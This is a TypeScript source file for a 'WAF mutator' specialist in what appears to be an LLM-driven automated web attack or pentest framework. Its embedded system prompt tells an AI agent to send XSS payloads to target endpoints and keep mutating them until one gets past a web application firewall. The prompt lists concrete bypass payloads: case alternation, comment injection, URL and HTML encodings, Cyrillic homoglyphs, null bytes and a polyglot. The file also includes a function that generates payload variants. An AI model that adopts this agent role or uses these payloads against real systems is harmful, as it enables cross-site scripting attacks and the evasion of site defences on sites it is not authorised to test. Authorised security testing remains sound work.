// src/agents/specialists-v2/waf-mutator.ts
// WAF mutator specialist: when a payload is blocked by a WAF, mutate
// the payload to find a bypass. LLM-driven mutation + primitive mutators.

import type { SpecialistFactory } from './types';
import type { AppModel } from '../../core/app-model';

const SYSTEM_PROMPT = `You are a WAF bypass mutation specialist.

Approach:
1. Start with a canonical payload for the technique (e.g., <script>alert(1)</script> for XSS).
2. Send it. If 200 with payload reflected unescaped, vulnerable. If 403/blocked, mutate.
3. Mutation strategies (try in order):
   a. Case alternation: <ScRiPt>alert(1)</sCrIpT>
   b. Comment injection: <scr<!---->ipt>alert(1)</script>
   c. Encoding: %3Cscript%3E, &#x3C;script&#x3E;, \\u003cscript\\u003e
   d. Unicode homoglyphs: <ѕcript> (Cyrillic ѕ)
   e. Concatenation: '<'+'script'+'>'+'alert(1)'+'<''+'/script'+'>'
   f. Polyglot: jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcliCk=alert(1) )//
   g. Null bytes: <scr%00ipt>
4. Try each variant. Stop on first that returns 200 with payload in body.
5. Strong evidence: 200 + payload in body after a mutation that the WAF didn't catch.

Tools: httpRequest, mutate_payload (applies common mutations), conclude.`;

export const wafMutatorSpecialist: SpecialistFactory = {
  name: 'waf-mutator',
  description: 'WAF bypass via mutation. LLM-driven + canonical mutators (case, comment, encoding, unicode).',
  shouldInclude: (appModel: AppModel) => {
    // Always include — a WAF may show up at any point.
    return (appModel.endpoints || []).length > 0;
  },
  build: (tools) => ({
    name: 'waf-mutator',
    description: 'WAF bypass via mutation. LLM-driven + canonical mutators (case, comment, encoding, unicode).',
    systemPrompt: SYSTEM_PROMPT,
    tools: ['httpRequest', 'mutatePayload', 'conclude'].map((n) => tools[n as keyof typeof tools]).filter(Boolean) as Array<{ name: string; description: string; schema: Record<string, unknown> }>,
  }),
};

/** Apply a list of common mutations to a payload. Pure function for tests. */
export function mutatePayload(payload: string): string[] {
  const out: string[] = [];
  out.push(payload);
  out.push(payload.toUpperCase());
  out.push(payload.split('').map((c, i) => (i % 2 === 0 ? c.toLowerCase() : c.toUpperCase())).join(''));
  out.push(payload.replace('<', '%3C').replace('>', '%3E'));
  out.push(payload.replace('<', '&#x3C;').replace('>', '&#x3E;'));
  out.push(payload.replace('<', '<\\u0000'));
  out.push(`<!--${payload}-->`);
  return out;
}
